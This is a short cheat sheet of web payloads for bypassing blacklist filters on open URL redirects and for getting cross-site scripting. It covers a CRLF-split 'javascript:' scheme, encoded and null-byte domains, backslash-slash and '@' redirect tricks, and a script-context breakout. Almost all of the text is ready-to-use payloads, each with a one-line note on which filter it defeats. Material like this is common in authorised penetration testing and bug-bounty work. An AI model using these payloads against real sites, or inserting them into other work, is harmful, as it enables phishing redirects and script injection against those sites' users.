Methods for bypassing filters


Every case is different with open url redirects but here are some payloads I use for getting a successful redirect / xss

java%0d%0ascript%0d%0a:alert(0)
(crlf injection to bypass javascript: being blacklisted) 

//google.com
(incase http:// is blacklisted)

https:google.com
(browsers accept this, good if // is blacklisted!)

//google%E3%80%82com
(%E3%80%82 is 。 encoded. A HUGE thanks to filedescriptor for showing me that) 

\/\/google.com/
(useful for bypassing // http:// blacklists. Browsers see \/\/ as //) 

/\/google.com/
(same as above) 

//google%00.com
(null byte to bypasses blacklist filter. can be used anywhere) 

http://www.theirsite.com@yoursite.com/
(oldie, but browsers will redirect to anything after @)

http://www.yoursite.com/http://www.theirsite.com/
(if @ is blacklisted and they check if their domain is in the param, make a folder as their domain :D)

";alert(0);//
(example from above. if the url is echo'd in a variable and we want to get xss in script tag)

..and there we have it.

Special Thank : @zseano
